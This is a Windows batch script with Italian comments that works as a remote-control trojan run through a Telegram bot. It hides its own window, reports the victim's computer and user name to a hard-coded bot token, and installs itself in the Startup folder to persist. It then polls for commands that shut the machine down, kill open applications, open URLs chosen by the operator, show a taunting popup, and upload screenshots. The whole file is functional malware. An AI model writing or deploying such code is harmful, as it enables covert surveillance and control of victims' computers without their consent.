@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
set "URL_FILE=%TEMP%\last_url.txt"
set "FIRST_RUN=1"

:: Invia notifica di connessione
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🟢 Nuova connessione da: %COMPUTERNAME% (%USERNAME%)"

:: Aggiungi all'avvio automatico
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_controller.bat" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Loop principale
:command_loop
:: Controlla nuovi messaggi
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" > "%TEMP%\updates.json"

:: Estrai comandi dai messaggi
for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.message.text){Write-Output ($_.message.text)}}}"') do (
    set "command=%%A"
    
    if /i "!command!" == "chiudi" (
        :: Spegni il computer
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🔴 Spegnimento di: %COMPUTERNAME%"
        shutdown /s /t 0
        exit
    )
    
    if /i "!command!" == "apri" (
        :: Mostra popup "Valerio è stato qui"
        mshta vbscript:Execute("msgbox ""Valerio è stato qui"",0,""Messaggio"")(window.close)")
        
        :: Apri l'ultimo URL
        if exist "%URL_FILE%" (
            set /p last_url=<"%URL_FILE%"
            if defined last_url (
                :: Chiudi TUTTE le applicazioni con finestre
                powershell -command "Get-Process | Where-Object { $_.MainWindowTitle -ne '' -and $_.ProcessName -ne 'explorer' -and $_.ProcessName -ne 'System' } | ForEach-Object { $_.CloseMainWindow() | Out-Null; Start-Sleep -Milliseconds 200; if (!$_.HasExited) { $_.Kill() } }"
                
                :: Apri URL
                start "" "!last_url!"
                
                :: Attesa e screenshot
                timeout /t 10 /nobreak >nul
                call :capture_screen
            )
        )
    ) else if "!command!" neq "" (
        echo !command! | findstr /r /c:"^http://" /c:"^https://" >nul && (
            :: Salva nuovo URL
            echo !command! > "%URL_FILE%"
            
            :: Chiudi TUTTE le applicazioni con finestre
            powershell -command "Get-Process | Where-Object { $_.MainWindowTitle -ne '' -and $_.ProcessName -ne 'explorer' -and $_.ProcessName -ne 'System' } | ForEach-Object { $_.CloseMainWindow() | Out-Null; Start-Sleep -Milliseconds 200; if (!$_.HasExited) { $_.Kill() } }"
            
            :: Apri nuovo URL
            start "" "!command!"
            
            :: Notifica apertura URL
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                -d "chat_id=%CHAT_ID%" ^
                -d "text=🔗 Apertura URL su %COMPUTERNAME%: !command!"
            
            :: Attesa e screenshot
            timeout /t 10 /nobreak >nul
            call :capture_screen
        )
    )
)

:: Attesa prima di controllare nuovi comandi
timeout /t 5 /nobreak >nul
goto command_loop

:capture_screen
:: Cattura finestra attiva (Alt+Stamp)
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('%{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"

:: Invia screenshot
if exist "%SCREENSHOT_PATH%" (
    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
        -F chat_id=%CHAT_ID% ^
        -F photo=@"%SCREENSHOT_PATH%" ^
        -F caption="🖥️ %COMPUTERNAME%: Finestra attiva"
    del "%SCREENSHOT_PATH%" >nul
)
exit /b
